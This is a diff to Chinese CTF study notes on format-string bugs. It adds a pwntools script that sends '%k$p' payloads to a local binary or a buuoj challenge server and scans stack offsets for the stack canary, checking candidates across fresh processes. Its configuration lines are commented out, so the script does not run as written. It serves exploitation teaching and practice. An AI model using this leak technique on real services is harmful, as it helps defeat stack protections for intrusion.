@@ -1272,6 +1272,154 @@ printf(user_input);
 
 * 哪些值看起来像要写入的地址
 
+附：自动找 canary_k 的脚本：
+
+```
+# Wei
+
+from pwn import *
+
+context(os="linux", arch="amd64", log_level="info")
+
+# ====== 配置区：按实际环境修改 ======
+# BIN_PATH = "./web_of_sci_volga_2016"
+# HOST, PORT = "node5.buuoj.cn", 27101
+
+# USE_REMOTE = False  # 本地 True/False 自己切
+
+# PROMPT = b"Tell me your name first"   # 程序等待输入“name”的提示
+# =======================================
+
+
+def open_io():
+    """
+    每次打开一个“全新的”进程/连接。
+    为什么要全新？
+    - 因为 canary 是“进程级随机”，新进程能得到不同的 canary，用于二次验证。
+    """
+    if USE_REMOTE:
+        io = remote(HOST, PORT)
+    else:
+        io = process(BIN_PATH)
+
+    # 同步到输入点，避免我们发 payload 时程序还没 ready
+    io.recvuntil(PROMPT)
+    return io
+
+
+def leak_k_as_int(io, k: int):
+    """
+    向程序发送 `%k$p`，并把输出里形如 `0x...` 的值解析成 int。
+    返回:
+      - int: 解析成功
+      - None: 没有 `0x`（例如输出 (nil) 或格式不同）
+    """
+    payload = f"%{k}$p".encode()
+    io.sendline(payload)
+
+    # 程序输出通常会包含一行算式，然后下一行会把你 name printf 出来
+    # 为了稳一点，我们直接在接下来的输出里找 '0x'
+    data = io.recvuntil(b"\n", timeout=1) or b""
+
+    # 有的程序会在后续行才出现 0x，所以再多读几行兜底
+    if b"0x" not in data:
+        for _ in range(3):
+            more = io.recvuntil(b"\n", timeout=1) or b""
+            data += more
+            if b"0x" in data:
+                break
+
+    if b"0x" not in data:
+        return None
+
+    # 取出 '0x' 后面连续的 hex 字符
+    idx = data.find(b"0x")
+    hex_part = data[idx+2:].strip().split()[0]  # 取第一个 token
+    # 去掉可能的逗号句号等
+    hex_part = hex_part.strip(b",.;")
+
+    try:
+        return int(hex_part, 16)
+    except ValueError:
+        return None
+
+
+def looks_like_pointer(val: int) -> bool:
+    """
+    粗略判断是否像“典型指针地址”：
+    - 栈地址常见: 0x7fff...
+    - libc/ld 常见: 0x7f...
+    - PIE 程序代码段: 0x55...
+    这些都可能随 ASLR 变化，容易误判为 canary，所以先排除掉。
+    """
+    top = (val >> 40) & 0xff  # 取高位一个字节粗略判断
+    return top in (0x7f, 0x7e, 0x55)
+
+
+def is_canary_candidate(val: int) -> bool:
+    """
+    Canary 常见特征（启发式）：
+    1) 最低字节为 0
+    2) 不是 0
+    3) 不太像“指针形态”
+    """
+    if val is None:
+        return False
+    if val == 0:
+        return False
+    if (val & 0xff) != 0:
+        return False
+    if looks_like_pointer(val):
+        return False
+    return True
+
+
+def find_canary(max_k=100):
+    """
+    扫描 1..max_k，找出“最像 canary”的 k。
+    做法：
+    - 第一次：筛出候选
+    - 第二次：新进程再泄露一次，看是否变化（进程级随机）
+    """
+    candidates = []
+
+    for k in range(1, max_k + 1):
+        io = open_io()
+        v1 = leak_k_as_int(io, k)
+        io.close()
+
+        if not is_canary_candidate(v1):
+            continue
+
+        log.info(f"[k={k}] candidate v1={hex(v1)} ; doing 2nd check...")
+
+        # 二次验证：新进程再来一次
+        io2 = open_io()
+        v2 = leak_k_as_int(io2, k)
+        io2.close()
+
+        if v2 is None:
+            continue
+
+        # canary 对“新进程”一般会变化
+        if v2 != v1 and is_canary_candidate(v2):
+            log.success(f"[k={k}] VERY likely canary: v1={hex(v1)}, v2={hex(v2)}")
+            candidates.append((k, v1, v2))
+        else:
+            log.warning(f"[k={k}] looks suspicious but failed 2nd check: v1={v1}, v2={v2}")
+
+    return candidates
+
+
+if __name__ == "__main__":
+    cands = find_canary(max_k=80)
+    print("\n=== SUMMARY ===")
+    for k, v1, v2 in cands:
+        print(f"k={k}: {hex(v1)} -> {hex(v2)}")
+
+```
+
+然后在 pwndbg 中校验一下就可以了。
 
 #### 例题 1：jarvisoj_fm
 
